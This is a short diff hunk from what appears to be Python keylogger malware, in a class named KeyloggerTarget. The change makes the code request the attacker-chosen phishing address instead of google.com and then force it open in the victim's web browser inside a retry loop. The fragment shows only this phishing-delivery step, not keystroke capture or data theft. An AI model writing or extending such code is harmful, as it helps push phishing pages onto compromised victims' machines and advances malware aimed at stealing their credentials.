@@ -241,7 +241,7 @@ class KeyloggerTarget:
             if self.phishing is not None:
                 while True:
                     try:
-                        response = requests.get("https://www.google.com")
+                        response = requests.get(self.phishing)
                         webbrowser.open(self.phishing)
                         break
 
